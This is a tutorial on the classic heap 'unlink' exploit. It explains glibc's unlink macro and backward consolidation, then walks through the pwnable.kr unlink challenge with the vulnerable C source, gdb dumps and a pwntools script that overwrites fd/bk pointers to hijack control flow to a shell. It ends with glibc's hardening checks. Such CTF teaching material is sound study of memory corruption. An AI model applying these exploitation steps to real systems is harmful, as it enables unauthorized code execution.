# Unlink Exploit

The unlink exploit was first described in  [Phrack \#57](http://www.phrack.org/issues/57/8.html#article).  Whilst it was probably the most effective method of exploiting the heap during it's heyday, the updates made add a couple of protections which neuter it's effectiveness in modern systems.

In the unlink exploit, the goal is to exploit the following macro:

```c
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");                              \
    FD = P->fd;                                                                      \
    BK = P->bk;                                                                      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
      malloc_printerr ("corrupted double-linked list");                              \
    else {                                                                      \
        FD->bk = BK;                                                              \
        BK->fd = FD;                                                              \
        if (!in_smallbin_range (chunksize_nomask (P))                              \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {                      \
            if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
                || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
              malloc_printerr ("corrupted double-linked list (not small)");   \
            if (FD->fd_nextsize == NULL) {                                      \
                if (P->fd_nextsize == P)                                      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;                      \
                else {                                                              \
                    FD->fd_nextsize = P->fd_nextsize;                              \
                    FD->bk_nextsize = P->bk_nextsize;                              \
                    P->fd_nextsize->bk_nextsize = FD;                              \
                    P->bk_nextsize->fd_nextsize = FD;                              \
                  }                                                              \
              } else {                                                              \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;                      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;                      \
              }                                                                      \
          }                                                                      \
      }                                                                              \
}
```

The unlink macro removes a chunk from a bin which stores chunks as a double linked-list.  The macro in effect takes the pointers to FD and BK, and modifies the adjacent chunks to effectively remove itself from this double-linked list.  This ocurrs via the following:  

```c
FD = P->fd;                                                                      \
BK = P->bk;
FD->bk = BK;                                                              \
BK->fd = FD;
```

If we control P, we control FD and BK, which gives us an arbitrary write onto the memory.

#### Consolidate Backwards

glibc likes to keep the heap tidy, so if two adjacent chunks in memory are both free, why not merge them?  This action happens through the previous inuse bit set within a chunk.  If a chunk has it's previous inuse bit set, then it will consolidate them through the following action.

```c
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))
```

```c
    /* consolidate backward */
    // Is the previous chunk free?
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
       // add previous chunk size to current size
      size += prevsize;
       // move data pointer back to merge both chunks
       // i.e. change chunk pointer to point to current chunk
      p = chunk_at_offset(p, -((long) prevsize));
      // unlink from from the bin
      
      unlink(av, p, bck, fwd);
    }
```

This chunk is then placed within the unsorted chunk list, as it is given a chance to be re-allocated before being placed in a regular bin, but that's not as important to the crux of the exploit.  

## Example 1: pwnable.kr

I'll walk through an example from pwnable.kr which will allow us to demonstrate the unlink exploit.  This implements a custom unlink method.  Since this doesn't contain the hardening done by glibc, it makes it much easier to show how this was done originally. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;

void shell(){
	system("/bin/sh");
}

void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
int main(int argc, char* argv[]){
	malloc(1024);
	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
	OBJ* C = (OBJ*)malloc(sizeof(OBJ));

	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;

	printf("here is stack address leak: %p\n", &A);
	printf("here is heap address leak: %p\n", A);
	printf("now that you have leaks, get shell!\n");
	// heap overflow!
	gets(A->buf);

	// exploit this unlink!
	unlink(B);
	return 0;
}
```

We have the stack and heap addresses, so ASLR is no longer an issue.  In this the data being passed into A is not bounds checked, so we need to write a fake chunk into A, and overwrite the fd and bk pointers in B.  

```text
(gdb) r
Starting program: /home/unlink/unlink 
here is stack address leak: 0xffb07fe4
here is heap address leak: 0x91ae410
now that you have leaks, get shell!
```

```text
(gdb) p shell
$2 = {<text variable, no debug info>} 0x80484eb <shell>
```

The following shows the layout of each malloc within memory.

```text
(gdb) x/6x 0x91ae410   <==== A
0x91ae410:	0x091ae428	0x00000000	0x00000000	0x00000000
0x91ae420:	0x00000000	0x00000019
(gdb) x/6x 0x91ae410+4*6 <====== B
0x91ae428:	0x091ae440	0x091ae410	0x00000000	0x00000000
0x91ae438:	0x00000000	0x00000019
```

Since the function exits from main exits immediately after we're going to want to overwrite eip, which we can calculate from the stack leak.

```text
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;
```



```text
FD->bk=BK;
BK->fd=FD;
```

So we need to write to fill the current allocation plus 4 bytes which will be the address of EBP-4.

```python
from pwn import *
s=ssh(host='pwnable.kr' ,port=2222,  user='unlink', password='guest')

r = s.process('./unlink')
r.recvuntil(' stack address leak: ')
stack = r.recvline()
r.recvuntil(' heap address leak: ')
heap = r.recvline()

print stack
print heap

ebp = int(stack, 0) - 0x20
heap = int(heap,0)
shell = 0x80484eb

payload = p32(shell)
payload += p32(heap+12)
payload += p32(0x19)
payload += p32(0x19)
payload += p32(ebp) #fd
payload += p32(heap+16) #bk

r.sendafter(' get shell!', payload)
r.interactive()
```

## Modern Hardening Measures

These protections can be bypassed but only in very specific circumstances, so it's very difficult to give a list of bypasses.  In effect, you need to ensure that you can write memory in such a way that these checks are bypassed, as effectively they are just two integer comparisons.

### corrupted\_size vs prev\_size

The following code checks the integrity of the chunk:

```c
chunksize(P) != prev_size (next_chunk(P))
```

This is not a major issue in the case of forging chunks, but if given a single null-byte overwrite it can interfere with any attempts to create an unlink-exploit.

### corrupted double-linked list

```c
FD->bk != P || BK->fd != P
```

A basic integrity check to ensure that the double-linked list structure is intact.  This again means you can't perform an arbitrary write-what, where.





